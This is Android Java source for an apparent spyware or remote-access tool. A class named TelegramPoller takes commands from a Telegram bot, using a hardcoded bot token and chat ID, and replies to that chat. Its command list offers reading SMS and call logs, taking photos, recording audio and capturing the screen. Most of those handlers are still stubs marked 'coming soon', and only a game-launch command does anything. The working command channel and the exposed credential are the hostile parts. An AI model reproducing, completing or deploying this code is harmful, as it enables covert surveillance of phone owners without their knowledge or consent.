package com.silent.telebot;

import android.content.Context;
import android.content.Intent;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

public class TelegramPoller implements Runnable {
    private Context ctx;

    // ⚠️ ضع التوكن و CHAT_ID الصحيحين ⚠️
    private static final String BOT_TOKEN = "8664055093:AAFzjAY549sKvHPh7pdwepTgr7AUtzSW4c8";
    private static final String CHAT_ID = "7058836561";

    private static int lastUpdateId = 0;

    public TelegramPoller(Context ctx) {
        this.ctx = ctx;
    }

    @Override
    public void run() {
        try {
            String urlStr = "https://api.telegram.org/bot" + BOT_TOKEN +
                    "/getUpdates?offset=" + (lastUpdateId + 1) + "&timeout=30";
            HttpURLConnection conn = (HttpURLConnection) new URL(urlStr).openConnection();
            conn.setRequestMethod("GET");
            conn.setConnectTimeout(35000);
            conn.setReadTimeout(35000);

            BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            StringBuilder response = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) response.append(line);
            reader.close();
            conn.disconnect();

            JSONObject jsonResponse = new JSONObject(response.toString());
            if (jsonResponse.getBoolean("ok")) {
                JSONArray updates = jsonResponse.getJSONArray("result");
                for (int i = 0; i < updates.length(); i++) {
                    JSONObject update = updates.getJSONObject(i);
                    lastUpdateId = update.getInt("update_id");
                    if (update.has("message")) {
                        JSONObject message = update.getJSONObject("message");
                        String text = message.optString("text", "");
                        handleCommand(text);
                    }
                }
            }
        } catch (Exception e) {
            Log.e("TelegramPoller", "خطأ: " + e.getMessage());
        }
    }

    private void handleCommand(String cmd) {
        try {
            if (cmd.equals("/help")) {
                sendMessage("📋 الأوامر:\n/get_sms\n/get_calls\n/take_pic\n/record\n/screenshot\n/play");
            } else if (cmd.equals("/get_sms")) {
                sendMessage("📩 آخر 10 رسائل\n(سيتم تفعيلها قريباً)");
            } else if (cmd.equals("/get_calls")) {
                sendMessage("📞 آخر 10 مكالمات\n(سيتم تفعيلها قريباً)");
            } else if (cmd.equals("/take_pic")) {
                sendMessage("📷 سيتم التقاط صورة (سيتم تفعيلها قريباً)");
            } else if (cmd.equals("/record")) {
                sendMessage("🎤 سيبدأ التسجيل (سيتم تفعيله قريباً)");
            } else if (cmd.equals("/screenshot")) {
                sendMessage("🖥️ سيتم أخذ لقطة شاشة (سيتم تفعيلها قريباً)");
            } else if (cmd.equals("/play")) {
                // 🔥 فتح اللعبة الجديدة
                Intent intent = new Intent(ctx, WordOrderActivity.class);
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                ctx.startActivity(intent);
                sendMessage("🎮 تم فتح لعبة ترتيب الكلمات!");
            } else {
                sendMessage("❌ أمر غير معروف. استخدم /help");
            }
        } catch (Exception e) {
            sendMessage("❌ خطأ: " + e.getMessage());
        }
    }

    private void sendMessage(String text) {
        try {
            String encoded = java.net.URLEncoder.encode(text, "UTF-8");
            String url = "https://api.telegram.org/bot" + BOT_TOKEN +
                    "/sendMessage?chat_id=" + CHAT_ID + "&text=" + encoded;
            HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
            conn.setRequestMethod("GET");
            conn.setConnectTimeout(5000);
            conn.setReadTimeout(5000);
            conn.getResponseCode();
            conn.disconnect();
        } catch (Exception ignored) {}
    }
        }
